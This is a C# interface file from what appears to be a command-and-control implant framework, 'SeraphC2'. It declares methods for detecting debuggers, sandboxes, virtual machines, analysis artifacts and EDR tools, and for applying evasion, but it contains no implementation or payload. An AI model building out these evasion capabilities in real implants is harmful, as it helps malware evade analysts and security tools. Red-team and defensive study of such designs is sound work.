namespace SeraphC2.Implant.Core.Evasion;

/// <summary>
/// Interface for anti-detection and environment analysis capabilities
/// </summary>
public interface IAntiDetection
{
    /// <summary>
    /// Checks if a debugger is currently attached to the process
    /// </summary>
    bool IsDebuggerAttached();
    
    /// <summary>
    /// Detects if the current environment is a sandbox or analysis environment
    /// </summary>
    Task<bool> IsSandboxEnvironmentAsync();
    
    /// <summary>
    /// Detects security tools and EDR solutions running on the system
    /// </summary>
    Task<IEnumerable<string>> DetectSecurityToolsAsync();
    
    /// <summary>
    /// Performs comprehensive environment analysis to assess threat level
    /// </summary>
    Task<AnalysisEnvironmentInfo> AnalyzeEnvironmentAsync();
    
    /// <summary>
    /// Implements basic evasion techniques to avoid detection
    /// </summary>
    Task<bool> ImplementEvasionTechniquesAsync();
    
    /// <summary>
    /// Checks if the current process is running in a virtual machine
    /// </summary>
    Task<bool> IsVirtualMachineAsync();
    
    /// <summary>
    /// Detects if the system has insufficient resources (indicating sandbox)
    /// </summary>
    Task<bool> HasInsufficientResourcesAsync();
    
    /// <summary>
    /// Checks for common analysis tools and their artifacts
    /// </summary>
    Task<bool> HasAnalysisArtifactsAsync();
}

/// <summary>
/// Contains detailed information about the analysis environment
/// </summary>
public class AnalysisEnvironmentInfo
{
    public int SuspicionScore { get; set; }
    public bool IsVirtualMachine { get; set; }
    public bool IsSandbox { get; set; }
    public bool HasDebugger { get; set; }
    public bool HasInsufficientResources { get; set; }
    public bool HasAnalysisTools { get; set; }
    public List<string> DetectedTools { get; set; } = new();
    public List<string> SuspiciousProcesses { get; set; } = new();
    public List<string> SuspiciousFiles { get; set; } = new();
    public Dictionary<string, object> SystemMetrics { get; set; } = new();
    public DateTime AnalysisTimestamp { get; set; } = DateTime.UtcNow;
}